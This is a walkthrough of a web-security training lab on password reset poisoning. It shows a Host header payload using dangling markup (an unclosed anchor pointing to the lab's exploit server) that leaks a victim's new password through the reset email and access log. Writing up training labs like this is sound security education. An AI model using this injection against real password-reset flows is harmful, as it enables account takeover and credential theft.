# Password reset poisoning via dangling markup
* This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log into Carlos's account.
* You can log in to your won account using the following credentials: `wiener:peter`
	* Some anti-virus software scans links in emails to identify whether they are malicious.

### 1. Enumerate the web page's functionalities
* At the login panel, a "Forgot password?" funtionality is found.

![1](https://user-images.githubusercontent.com/53956303/156248220-9a4e21d5-4d21-4e89-bbee-9dbefbe887b6.png)
* When click the "Forgot password?", a panel to enter an username or email is found.
	* Use the provided username "wiener"

![14](https://user-images.githubusercontent.com/53956303/156259366-f1adb01c-3906-417e-912b-1eb0dccd63af.png)
* As a result, a new password is delivered to the email client on the exploit server.

![15](https://user-images.githubusercontent.com/53956303/156259464-2811c04a-af08-4132-a29d-cc98f7cfba2a.png)

### 2. Enumerate `GET /email` request
* The HTML content for the email is written to a string, but this is being sanitized using the _DOMPurify_ library before it is rendered by the browser.

![16](https://user-images.githubusercontent.com/53956303/156260323-1c68af4d-a62b-4b8a-b9ef-81da13645e69.png)
### 3. Test the reqeust by modify the Host header to a random port (`POST /forgot-password`)
* Modify to `Host: acf41fc11f721e87c0aa554c00de002c.web-security-academy.net:testport`. (It has to be non-numeric)

![17](https://user-images.githubusercontent.com/53956303/156261071-9830ba6e-4465-4d72-909e-4655781d9db2.png)
* In the email client, check the raw version of the emails, Notice that the injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.

![18](https://user-images.githubusercontent.com/53956303/156261139-ac0c1d51-4e6d-4921-a9e1-02eede319bfb.png)
### 4. Inject a dangling-markup payload pointing the exploit server
* The Host header is modified to `Host: acf41fc11f721e87c0aa554c00de002c.web-security-academy.net:'<a href="//exploit-acb41f221f8f1ecac0ee555601480068.web-security-academy.net/?`

![19](https://user-images.githubusercontent.com/53956303/156261417-3193de9f-9642-4434-a928-0ae82c1d4c3a.png)
* Send the request and check the email client.

![20](https://user-images.githubusercontent.com/53956303/156261556-cd7b4634-4ea3-4201-a816-8c6264b47da0.png)
* Most of the content are missing.
### 5. Send the request again as Carlos
* Change the username to Carlos and send the reqeust again.

![21](https://user-images.githubusercontent.com/53956303/156261807-752c1355-4021-4cf0-835a-f7efb44d9ec8.png)
* From the access log, the new password for Carlos is found.

![22](https://user-images.githubusercontent.com/53956303/156261928-7a9f11b8-a4a4-42f5-bb3e-bb05ac9bb529.png)
* Login using the obtained password. As a result, the lab is solved.

![23](https://user-images.githubusercontent.com/53956303/156262019-33f85c67-208f-49a4-9a37-a5f892da4f5a.png)
